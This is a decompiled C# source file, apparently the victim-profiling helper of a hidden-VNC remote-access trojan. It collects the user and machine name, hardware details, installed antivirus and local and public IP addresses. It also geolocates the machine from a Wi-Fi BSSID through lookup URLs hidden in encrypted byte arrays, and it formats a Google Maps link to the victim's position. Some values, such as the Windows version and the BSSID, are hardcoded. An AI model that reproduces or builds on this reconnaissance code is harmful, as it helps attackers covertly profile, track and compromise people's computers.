using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000EA RID: 234
	internal sealed class SystemInfo
	{
		// Token: 0x06000900 RID: 2304
		[DllImport("iphlpapi.dll", ExactSpelling = true)]
		private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint physicalAddrLen);

		// Token: 0x06000901 RID: 2305 RVA: 0x00061DE0 File Offset: 0x0005FFE0
		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width + "x" + height;
		}

		// Token: 0x06000902 RID: 2306 RVA: 0x00061E24 File Offset: 0x00060024
		public static string GetBattery()
		{
			try
			{
				string text = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
				string[] array = SystemInformation.PowerStatus.BatteryLifePercent.ToString(CultureInfo.InvariantCulture).Split(',');
				string text2 = array[array.Length - 1];
				return text + " (" + text2 + "%)";
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000903 RID: 2307 RVA: 0x00061EB0 File Offset: 0x000600B0
		private static string GetWindowsVersionName()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = Convert.ToString(managementObject["Name"]);
					}
					text = text.Split('|')[0];
					int length = text.Split(' ')[0].Length;
					text = text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x06000904 RID: 2308 RVA: 0x00061FA0 File Offset: 0x000601A0
		private static string GetBitVersion()
		{
			try
			{
				return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString()
					.Contains("x86") ? "(32 Bit)" : "(64 Bit)";
			}
			catch
			{
			}
			return "(Unknown)";
		}

		// Token: 0x06000905 RID: 2309 RVA: 0x00062004 File Offset: 0x00060204
		public static string GetSystemVersion()
		{
			return "Windows 11 Pro" + " " + "(64 Bit)";
		}

		// Token: 0x06000906 RID: 2310 RVA: 0x00062028 File Offset: 0x00060228
		public static string GetDefaultGateway()
		{
			try
			{
				IPAddress ipaddress = (from gatewayIPAddressInformation_0 in (from networkInterface_0 in NetworkInterface.GetAllNetworkInterfaces()
						where networkInterface_0.OperationalStatus == OperationalStatus.Up
						where networkInterface_0.NetworkInterfaceType != NetworkInterfaceType.Loopback
						select networkInterface_0).SelectMany(delegate(NetworkInterface networkInterface_0)
					{
						IPInterfaceProperties ipproperties = networkInterface_0.GetIPProperties();
						return (ipproperties != null) ? ipproperties.GatewayAddresses : null;
					})
					select (gatewayIPAddressInformation_0 != null) ? gatewayIPAddressInformation_0.Address : null into ipaddress_0
					where ipaddress_0 != null
					select ipaddress_0).FirstOrDefault();
				return (ipaddress != null) ? ipaddress.ToString() : null;
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000907 RID: 2311 RVA: 0x00062120 File Offset: 0x00060320
		public static string GetAntivirus()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						return "Not installed";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch
			{
			}
			return "N/A";
		}

		// Token: 0x06000908 RID: 2312 RVA: 0x00062204 File Offset: 0x00060404
		public static string GetLocalIp()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				foreach (IPAddress ipaddress in hostEntry.AddressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						return ipaddress.ToString();
					}
				}
			}
			catch
			{
			}
			return "No network adapters with an IPv4 address in the system!";
		}

		// Token: 0x06000909 RID: 2313 RVA: 0x0006226C File Offset: 0x0006046C
		public static string GetPublicIp()
		{
			try
			{
				return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[]
				{
					23, 61, 220, 157, 111, 249, 43, 180, 122, 28,
					107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
					238, 56, 3, 133, 224, 68, 195, 226, 41, 226,
					22, 191
				})).Replace("\n", "");
			}
			catch (Exception)
			{
				Logging.Log();
			}
			return "Request failed";
		}

		// Token: 0x0600090A RID: 2314 RVA: 0x000622D0 File Offset: 0x000604D0
		private static string GetBssid()
		{
			byte[] array = new byte[6];
			uint num = (uint)array.Length;
			try
			{
				string text = "192.168.0.1";
				if (SendARP(BitConverter.ToInt32(IPAddress.Parse(text).GetAddressBytes(), 0), 0, array, ref num) != 0)
				{
					return "unknown";
				}
				string[] array2 = new string[num];
				int num2 = 0;
				while (num2 < (long)num)
				{
					array2[num2] = array[num2].ToString("x2");
					num2++;
				}
				return string.Join(":", array2);
			}
			catch
			{
			}
			return "Failed";
		}

		// Token: 0x0600090B RID: 2315 RVA: 0x00062374 File Offset: 0x00060574
		public static string GetLocation()
		{
			string text = "98:9d:5d:bc:e5:d8";
			string text2 = "Unknown";
			string text3 = "Unknown";
			string text4 = "Unknown";
			string text5;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					text5 = webClient.DownloadString(StringsCrypt.Decrypt(new byte[]
					{
						239, 87, 16, 244, 130, 200, 219, 198, 121, 223,
						110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
						11, 159, 146, 91, 205, 36, 0, 49, 166, 93,
						22, 23, 221, 210, 170, 52, 17, 123, 35, 113,
						33, 136, 114, 109, 224, 65, 139, 150, 160, 210,
						179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
						68, 222, 51, 47
					}) + text);
				}
			}
			catch
			{
				return "BSSID: " + text;
			}
			string text6;
			if (!text5.Contains("{\"result\":200"))
			{
				text6 = "BSSID: " + text;
			}
			else
			{
				int num = 0;
				string[] array = text5.Split(' ');
				foreach (string text7 in array)
				{
					num++;
					if (text7.Contains("\"lat\":"))
					{
						text2 = array[num].Replace(",", "");
					}
					if (text7.Contains("\"lon\":"))
					{
						text3 = array[num].Replace(",", "");
					}
					if (text7.Contains("\"range\":"))
					{
						text4 = array[num].Replace(",", "");
					}
				}
				string text8 = string.Concat("BSSID: ", text, "\nLatitude: ", text2, "\nLongitude: ", text3, "\nRange: ", text4);
				if (text2 != "Unknown" && text3 != "Unknown")
				{
					text8 = string.Concat(text8, "\n[Open google maps](", StringsCrypt.Decrypt(new byte[]
                    {
                        59, 129, 195, 34, 227, 242, 76, 173, 34, 247,
                        140, 112, 238, 245, 161, 60, 49, 127, 57, 59,
                        227, 89, 70, 152, 32, 242, 56, 102, 234, 75,
                        63, 18, 228, 223, 4, 147, 131, 146, 214, 158,
                        87, 69, 119, 232, 58, 195, 55, 105
                    }), text2, " ", text3, ")");
				}
				text6 = text8;
			}
			return text6;
		}

		// Token: 0x0600090C RID: 2316 RVA: 0x00062578 File Offset: 0x00060778
		public static string GetCpuName()
		{
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementBaseObject managementBaseObject = enumerator.Current;
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						return managementObject["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600090D RID: 2317 RVA: 0x00062604 File Offset: 0x00060804
		public static string GetGpuName()
		{
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementBaseObject managementBaseObject = enumerator.Current;
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						return managementObject["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600090E RID: 2318 RVA: 0x00062690 File Offset: 0x00060890
		public static string GetRamAmount()
		{
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementBaseObject managementBaseObject = enumerator.Current;
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
							num = (int)(num2 / 1048576.0);
						}
					}
				}
				return num + "MB";
			}
			catch
			{
			}
			return "-1";
		}

		// Token: 0x0600090F RID: 2319 RVA: 0x00006F52 File Offset: 0x00005152
		public SystemInfo()
		{
		}

		// Token: 0x06000910 RID: 2320 RVA: 0x00062750 File Offset: 0x00060950
		// Note: this type is marked as 'beforefieldinit'.
		static SystemInfo()
		{
		}

		// Token: 0x0400074A RID: 1866
		public static string Username = Environment.UserName;

		// Token: 0x0400074B RID: 1867
		public static string Compname = Environment.MachineName;

		// Token: 0x0400074C RID: 1868
		public static string Culture = CultureInfo.CurrentCulture.ToString();

		// Token: 0x0400074D RID: 1869
		public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

		// Token: 0x020000EB RID: 235
		[CompilerGenerated]
		[Serializable]
		private sealed class cccc
		{
			// Token: 0x06000911 RID: 2321 RVA: 0x0000AD0A File Offset: 0x00008F0A
			// Note: this type is marked as 'beforefieldinit'.
			static cccc()
			{
			}

			// Token: 0x06000912 RID: 2322 RVA: 0x00006F52 File Offset: 0x00005152
			public cccc()
			{
			}

			// Token: 0x06000913 RID: 2323 RVA: 0x0000AD16 File Offset: 0x00008F16
			internal bool GetDefaultGateway_10_0(NetworkInterface networkInterface_0)
			{
				return networkInterface_0.OperationalStatus == OperationalStatus.Up;
			}

			// Token: 0x06000914 RID: 2324 RVA: 0x0000AD21 File Offset: 0x00008F21
			internal bool GetDefaultGateway_10_1(NetworkInterface networkInterface_0)
			{
				return networkInterface_0.NetworkInterfaceType != NetworkInterfaceType.Loopback;
			}

			// Token: 0x06000915 RID: 2325 RVA: 0x0000AD30 File Offset: 0x00008F30
			internal IEnumerable<GatewayIPAddressInformation> GetDefaultGateway_10_2(NetworkInterface networkInterface_0)
			{
				IPInterfaceProperties ipproperties = networkInterface_0.GetIPProperties();
				return (ipproperties != null) ? ipproperties.GatewayAddresses : null;
			}

			// Token: 0x06000916 RID: 2326 RVA: 0x0000AD44 File Offset: 0x00008F44
			internal System.Net.IPAddress GetDefaultGateway_10_3(GatewayIPAddressInformation gatewayIPAddressInformation_0)
			{
				return (gatewayIPAddressInformation_0 != null) ? gatewayIPAddressInformation_0.Address : null;
			}

			// Token: 0x06000917 RID: 2327 RVA: 0x0000AD52 File Offset: 0x00008F52
			internal bool GetDefaultGateway_10_4(IPAddress ipaddress_0)
			{
				return ipaddress_0 != null;
			}

			// Token: 0x0400074E RID: 1870
			public static readonly SystemInfo.cccc ccc9 = new SystemInfo.cccc();

			// Token: 0x0400074F RID: 1871
			public static Func<NetworkInterface, bool> ccc9__10_0;

			// Token: 0x04000750 RID: 1872
			public static Func<NetworkInterface, bool> ccc9__10_1;

			// Token: 0x04000751 RID: 1873
			public static Func<NetworkInterface, IEnumerable<GatewayIPAddressInformation>> ccc9__10_2;

			// Token: 0x04000752 RID: 1874
			public static Func<GatewayIPAddressInformation, IPAddress> ccc9__10_3;

			// Token: 0x04000753 RID: 1875
			public static Func<IPAddress, bool> ccc9__10_4;
		}
	}
}
